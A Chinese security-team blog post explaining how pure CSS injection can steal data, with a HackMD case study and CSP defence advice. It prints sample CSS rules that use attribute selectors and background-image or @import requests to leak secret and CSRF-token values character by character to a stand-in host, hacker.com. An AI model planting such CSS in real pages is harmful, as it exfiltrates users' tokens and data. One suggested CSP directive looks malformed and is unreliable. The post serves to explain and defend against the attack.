> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg2NTkwODU3Ng==&mid=2247515373&idx=1&sn=28be83d1aa224fed61ba5c5731b289c2

#  警惕！纯 CSS 也能偷数据？这种攻击比 XSS 更隐蔽！  
原创 东方隐侠集智堂  东方隐侠安全团队   2025-06-15 15:58  
  
你以为只有 JavaScript 能搞破坏？大错特错！当黑客盯上你的网站时，一行 CSS 代码就能悄悄偷走敏感信息 —— 从 CSRF Token到页面文本，甚至 JavaScript 代码！  
  
今天就来揭开**纯 CSS 攻击**  
的神秘面纱，看看黑客如何用样式代码发动 “视觉欺骗”。  
👇  
### 一、CSS 注入：被低估的 “样式黑客”  
  
传统攻击如 XSS 依赖 JavaScript 执行，但 CSS 注入更 “狡猾”：  
- 无需 JS 参与：仅通过<style>标签注入恶意 CSS，绕过 CSP 策略限制  
  
- 隐蔽性极强：仅修改页面样式，肉眼难辨异常，却能窃取数据  
  
- 攻击链完整：结合属性选择器、字体加载等特性，实现数据外漏  
  
举个栗子：黑客注入以下 CSS，就能通过背景图片请求，判断输入框 value 值的首字符：  
  

```
input[name=&#34;secret&#34;][value^=&#34;a&#34;] { background: url(https://hacker.com?q=a) }
input[name=&#34;secret&#34;][value^=&#34;b&#34;] { background: url(https://hacker.com?q=b) }
```

  
  
当浏览器加载对应样式时，服务器会收到带参数的请求，从而窃取 “secret” 字段的值。  
### 二、黑客的 CSS 攻击工具箱  
##### 1. 属性选择器：精准定位数据  
  
通过
```
[attribute^=value]
```

  
等选择器，黑客可定位特定属性的元素，配合背景图请求窃取数据。即使是
```
type=&#34;hidden&#34;
```

  
的表单字段，也能通过相邻元素间接触发请求：  
  

```
input[name=&#34;csrf-token&#34;][value^=&#34;a&#34;] + input { background: url(https://hacker.com?q=a) }
```

  
##### 2. @import 动态加载：字符逐个偷  
  
利用 CSS 的 @import 规则，黑客可构建循环加载机制：  
- 首次请求加载
```
@import url(https://hacker.com/start?len=8)
```

  
  
- 
```
服务器响应分阶段的 Payload，逐字符窃取数据（如先偷首字符，再偷第二位）
```

  
  
- 
```
通过域名分流（如主域加载 CSS，子域加载背景图）绕过浏览器请求限制
```

  
  
##### 3. 字体攻击：从 “看字” 到 “偷字”  
- **unicode-range：为特定字符设置外部字体，通过字体加载请求判断字符存在******  
  
- **字体高度差：利用不同字体的高度差异，结合滚动条样式触发数据外漏**  
  
- **连字技巧：自定义字体将字符组合渲染为宽元素，通过滚动条是否出现判断字符组合**  
  
### 三、实战案例：黑客如何攻破 HackMD？  
  
HackMD 曾因允许<style>标签且 CSP 配置宽松，被发现可通过 CSS 注入窃取 CSRF 令牌：  
  
（1）黑客注入 CSS，利用属性选择器定位隐藏的 csrf-token 字段  
  
（2）通过实时更新机制，分阶段替换 Payload，逐字符窃取令牌  
  
（3）虽然 HackMD 检查 Origin 头阻止 CSRF，但令牌泄露已构成严重威胁  
  
更夸张的是 corCTF 挑战赛中，黑客通过 iframe 嵌套 + DOM 覆盖，用 CSS 注入窃取 React 应用的页面数据 —— 这证明 CSS 攻击与其他漏洞结合时，破坏力会指数级增长！  
#### 四、防御指南：三步筑牢 CSS 安全防线  
1. **严格过滤<style>标签：**  
禁用用户输入中的<style>标签，或使用 CSP 的
```
style-src 'self'
```

  
限制样式来源  
  
1. **限制字体与资源加载：**  
  
1. 通过 CSP 的
```
font-src
```

  
限制字体来源，阻止恶意 @font-face 加载  
  
1. 禁用
```
@import
```

  
语法：
```
style-src 'self' 'unsafe-inline' -url(https:)
```

  
  
1. **增强数据防护机制：**  
  
1. CSRF 令牌除了隐藏字段，可同时存于 HTTP 头（如 Origin），双重验证  
  
1. 对敏感数据所在元素添加特殊防护，避免被属性选择器定位  
  
#### 结语  
  
CSS 注入就像网络安全中的 “隐形刺客”，用样式层的伪装实施攻击。随着浏览器对 CSS 功能的扩展（如:has 选择器），攻击手段还在进化。开发者需将 CSS 安全纳入防御体系，别让一行样式代码成为系统漏洞的突破口！  
  
  
参考资料：  
  
CSS 注入原理解析  
  
实战案例：CSS 窃取数据全流程  
  
🔍   
完整内容，请查看原文链接，欢迎少侠们关注与注册  
东方隐侠官方网站“隐侠安全客栈”  
！  
  
📢 你的网站测过 CSS 注入风险吗？评论区聊聊你的防护经验！  
  
关注东方隐侠安全团队 一起打造网安江湖  
  
东方隐侠安全团队，一支专业的网络安全团队，将持续为您分享红蓝对抗、病毒研究、安全运营、应急响应等网络安全知识，提供一流网络安全服务，敬请关注！  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/icqGYtiaRQqH7zgibKsqKmX3H4AatvwPeXFsrHGpp0RsxLJpzgd0cyiaPH2HDnfv4GMdxf0lkGjAibiaBtFcLmnm2ZkA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
  
  
公众号｜东方隐侠安全团队  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/icqGYtiaRQqH4laNHWaR5yOd2VbInJbO4h3daHtdT7pcSk7zONRMDyl2cht3U4dbbyiaLmMA5DpBBlTgspa3agKyw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
  
  
请添加团队微信号  
｜东方隐侠安全团队  
  
用于拉少侠们进团队交流群  
  
